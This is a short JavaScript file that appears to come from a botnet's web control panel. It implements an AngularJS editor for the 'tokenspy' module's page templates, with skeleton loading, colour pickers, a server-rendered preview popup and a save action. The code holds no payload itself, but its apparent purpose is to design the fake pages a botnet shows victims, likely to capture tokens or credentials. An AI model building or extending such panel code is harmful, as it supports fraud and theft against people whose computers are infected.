'use strict';

define('page-botnet_tokenspy-edittpl', ['jquery'], function($){
    var init = function(skeleton, onSave){
        require(['page-botnet_tokenspy-edittpl-ng'], function(App){
            App.init(
                document.getElementById('tokenspy-edittpl'),
                window.data.tokenspy.edittpl,
                skeleton,
                onSave
            );
        });
    };
    return { init: init };
});


define('page-botnet_tokenspy-edittpl-ng', ['angular', 'underscore', 'jquery', 'ckeditor', 'bootstrap', 'angular-extensions', 'jquery.colorpicker'], function(angular, _, $, CKEDITOR){
    var init = function(ngApp, appData, skeleton, onSave){
        var app = angular.module('TokenSpy.edittpl', ['Extensions']);

        // Controller
        var ctrl = app.controller('TsEditTplCtrl', ['$scope', '$element', function($scope, $element){
            $scope.availableSkeletons = appData.availableSkeletons;

            $scope.skeleton = {
                name: undefined,
                url: undefined,
                values: {}
            };
            if (skeleton){
                _.extend($scope.skeleton, skeleton);
                _.extend($scope.skeleton.values, skeleton.values);
            }

            // Skeleton partial loader
            $scope.$watch('skeleton.name', function(newVal, oldVal){
                $scope.skeleton.url = $scope.skeleton.name
                    ? '?m=botnet_tokenspy/ajaxLoadSkeletonPartial&skeleton=' + encodeURIComponent(newVal)
                    : undefined
                ;
            });
            $scope.onSkeletonLoad = function(){
                // Feed it with default values
                _.defaults($scope.skeleton.values, appData.skeletonDefaultValues); // got via jsonset() on window

                // Init color pickers
                $('.ts-skeleton-sets input.input-colorpicker').colorpicker({
                    colorFormat: '#HEX',
                    inline: false,
                    draggable: true,
                    rgb: false,
                    showCancelButton: false,
                    showCloseButton: false,
                    select: _.throttle(function(e) {
                        var $elm = $(this);
                        var ctrl = $elm.controller('ngModel'); // access the element's ngModelController

                        $scope.$apply(function() {
                            ctrl.$setViewValue($elm.val()); // update model from view
                        });
                    }, 150)
                });
            };

            // Actions
            $scope.actions = {
                preview: function(){
                    $.post('?m=botnet_tokenspy/ajaxPagePreview', {skeleton: JSON.stringify($scope.skeleton)}, function(html){
                        var win=window.open('about:blank', 'popup', 'width=800,height=600');

                        win.document.open();
                        win.document.write(html);
                        win.document.close();
                    });
                },
                save: function(){
                    onSave($scope.skeleton);
                }
            };
        }]);

        // Bootstrap
        angular.bootstrap(ngApp, ['TokenSpy.edittpl']);
    };

    return { init: init };
});
